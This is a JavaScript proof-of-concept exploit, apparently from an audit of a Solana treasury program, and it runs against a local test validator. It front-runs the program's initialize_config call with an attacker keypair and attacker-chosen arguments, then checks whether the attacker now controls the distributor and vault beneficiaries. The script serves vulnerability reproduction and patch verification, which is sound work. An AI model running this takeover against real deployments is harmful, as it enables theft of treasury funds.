// F2 PoC: an attacker keypair initialises the config before the deployer.
// Expectation on UNPATCHED code: it SUCCEEDS and config.distributor == attacker.
// Expectation after the patch: Unauthorized.
import fs from 'node:fs';
import crypto from 'node:crypto';
import { Connection, Keypair, PublicKey, SystemProgram, Transaction, TransactionInstruction } from '@solana/web3.js';

const RPC = process.env.RPC || 'http://127.0.0.1:8992';
const DIR = '/mnt/d/flpwe3/flp-treasury/.local-v5';
const conn = new Connection(RPC, 'confirmed');
const PROGRAM_ID = new PublicKey('3uvGiB1BshLcuLBtGk6bJceYGoYruPo3mxLs39tc4vGT');
const DAMM = new PublicKey('cpamdpZCGKUy5JxQXB4dcpGPiikHawvSWAd6mEn1sGG');

const disc = (n) => crypto.createHash('sha256').update(`global:${n}`).digest().subarray(0, 8);
const i64 = (v) => { const b = Buffer.alloc(8); b.writeBigInt64LE(BigInt(v)); return b; };
const u64 = (v) => { const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(v)); return b; };
const pk = (k) => Buffer.from(k.toBuffer());
const pda = (s) => PublicKey.findProgramAddressSync(s, PROGRAM_ID)[0];

(async () => {
  fs.mkdirSync(DIR, { recursive: true });

  const ATT_FILE = `${DIR}/attacker.json`;
  let attacker;
  if (fs.existsSync(ATT_FILE)) attacker = Keypair.fromSecretKey(Uint8Array.from(JSON.parse(fs.readFileSync(ATT_FILE, 'utf8'))));
  else { attacker = Keypair.generate(); fs.writeFileSync(ATT_FILE, JSON.stringify(Array.from(attacker.secretKey))); }

  const config = pda([Buffer.from('config')]);
  const stats = pda([Buffer.from('stats')]);
  const dividendVault = pda([Buffer.from('dividend_vault')]);
  const opsVault = pda([Buffer.from('ops_vault')]);
  const liqVault = pda([Buffer.from('liq_vault')]);
  const devVault = pda([Buffer.from('dev_vault')]);
  const solBuffer = pda([Buffer.from('sol_buffer')]);

  const existing = await conn.getAccountInfo(config);
  if (existing) {
    console.log('config already exists — reset v5 first');
    const d = Buffer.from(existing.data);
    console.log('  distributor in config:', new PublicKey(d.subarray(40, 72)).toBase58());
    process.exit(0);
  }

  console.log('attacker:', attacker.publicKey.toBase58());
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  const waitSig = async (sig) => {
    for (let i = 0; i < 80; i++) {
      const v = (await conn.getSignatureStatus(sig))?.value;
      if (v?.err) return v;
      if (v && (v.confirmationStatus === 'confirmed' || v.confirmationStatus === 'finalized')) return v;
      await sleep(500);
    }
    return null;
  };
  const air = await conn.requestAirdrop(attacker.publicKey, 2_000_000_000);
  await waitSig(air);
  console.log('airdrop ok, balance', (await conn.getBalance(attacker.publicKey)) / 1e9);

  const fakeMint = Keypair.generate().publicKey;
  const fakePool = Keypair.generate().publicKey;
  const now = Math.floor(Date.now() / 1000);

  // 8 args, all attacker-controlled
  const data = Buffer.concat([
    disc('initialize_config'),
    pk(fakeMint), pk(attacker.publicKey), pk(DAMM), pk(fakePool),
    pk(attacker.publicKey), i64(now), u64(50_000_000n), pk(attacker.publicKey),
  ]);

  const tx = new Transaction().add(new TransactionInstruction({
    programId: PROGRAM_ID,
    keys: [
      { pubkey: attacker.publicKey, isSigner: true, isWritable: true },
      { pubkey: config, isSigner: false, isWritable: true },
      { pubkey: stats, isSigner: false, isWritable: true },
      { pubkey: dividendVault, isSigner: false, isWritable: true },
      { pubkey: opsVault, isSigner: false, isWritable: true },
      { pubkey: liqVault, isSigner: false, isWritable: true },
      { pubkey: devVault, isSigner: false, isWritable: true },
      { pubkey: solBuffer, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data,
  }));
  const { blockhash } = await conn.getLatestBlockhash('confirmed');
  tx.recentBlockhash = blockhash;
  tx.feePayer = attacker.publicKey;
  tx.sign(attacker);

  let sig, err = null;
  try { sig = await conn.sendRawTransaction(tx.serialize()); }
  catch (e) { err = (e.message || '').split('\n').find((l) => l.includes('Error Code')) || e.message; }
  if (!err) {
    const v = await waitSig(sig);
    if (!v) err = 'not confirmed in 40s';
    else if (v.err) err = JSON.stringify(v.err);
  }

  const after = await conn.getAccountInfo(config);
  const out = { attacker: attacker.publicKey.toBase58(), sig: sig ?? null, err };
  if (after) {
    const d = Buffer.from(after.data);
    out.fairMint = new PublicKey(d.subarray(8, 40)).toBase58();
    out.distributor = new PublicKey(d.subarray(40, 72)).toBase58();
    // borsh: 8 disc + 4 pubkeys(128) + 3 u8(3) + 5 u64(40) = 179
    out.devBeneficiary = new PublicKey(d.subarray(179, 211)).toBase58();
    out.opsDest = new PublicKey(d.subarray(179 + 32 + 8 + 8 + 8, 179 + 32 + 8 + 8 + 8 + 32)).toBase58();
    out.pwned = out.distributor === attacker.publicKey.toBase58();
  } else {
    out.pwned = false;
  }
  console.log(JSON.stringify(out, null, 2));
  console.log(out.pwned ? 'SEIZED  <-- vulnerability reproduced' : 'not seized');
  fs.writeFileSync(`${DIR}/poc-f2.json`, JSON.stringify(out, null, 2));
})().catch((e) => { console.error('FAILED:', e.message); process.exit(1); });
